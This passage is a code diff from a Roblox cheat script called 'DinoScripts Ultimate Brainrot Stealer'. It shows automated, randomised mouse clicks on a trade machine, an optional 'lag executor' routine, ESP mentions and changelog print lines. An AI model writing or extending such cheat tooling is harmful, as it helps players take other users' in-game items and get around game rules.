-            {viewport.X * 0.7, viewport.Y * 0.85}, -- Right bottom area
-            {viewport.X * 0.3, viewport.Y * 0.85} -- Left bottom area
-        }
-
-        for _,pos in ipairs(commonPositions) do
-            mousemoverel(pos[1]+math.random(-15,15), pos[2]+math.random(-10,10))
-            wait(math.random()*0.2+0.1)
-            mouse1click()
-            wait(math.random()*0.15+0.08)
-
-            StatusLabel.Text=StatusLabel.Text.."\nTried clicking at common position"
-
-            break -- Try one position only to avoid spam
-
-        end
-
-    end
-
-    -- Step6: Lag executor if enabled (optional)
-    if lagEnabled then
-        lagExecutor()
-    end
-
-    -- Final status update with safety delay
-    wait(2)
-
-    PartnerDisplay.Visible=true
-    PartnerDisplayLabel.Text="Trading with: "..targetName.." (via trade machine)"
-
-    StatusLabel.Text="✅ Brainrot steal COMPLETE!\nTarget searched via trade machine\nNo need for target in server!"
-
-end)
-
--- MANUAL SEARCH BUTTON FUNCTION
-StartSearchButton.MouseButton1Click:Connect(function()
-    manualSearchTrade()
-end)
-
--- Final initialization message with instructions
-wait(1)
-
-StatusLabel.Text="DinoScripts Ultimate v4.3 LOADED\nPlatform: "..platform.."\nFixed trade machine detection\nSafe mouse functions\nSearch ANY player via trade machine\nESP: Press T to toggle"
-
-print("[DinoScripts] Ultimate Brainrot Stealer v4.3 loaded successfully!")
-print("[DinoScripts] UI fixed and working")
-print("[DinoScripts] Trade machine detection fixed - won't go to shops")
-print("[DinoScripts] Mouse functions fixed - no more game crashes")
-print("[DinoScripts] Can search ANY player via trade machine")
-print("[DinoScripts] Added manual search button for when auto-find fails")
-print("[DinoScripts] Added Player ESP (Toggle with T)")
-print("[DinoScripts] Made by Dino")
+                        print(
+                        "[DinoScripts] Ultimate Brainrot Stealer v4.4 loaded successfully!")
+                        print(
+                        "[DinoScripts] Fixed mouse click targeting - won't select script UI")
+                        print(
+                        "[DinoScripts] Added draggable green minimap button")
+                        print(
+                        "[DinoScripts] Smaller UI (350x420)")
+                        print(
+                        "[DinoScripts] Trade machine detection working")
+                        print(
+                        "[DinoScripts] Manual trade function fixed")
+                        print(
+                        "[DinoScripts] Made by Dino")
+`
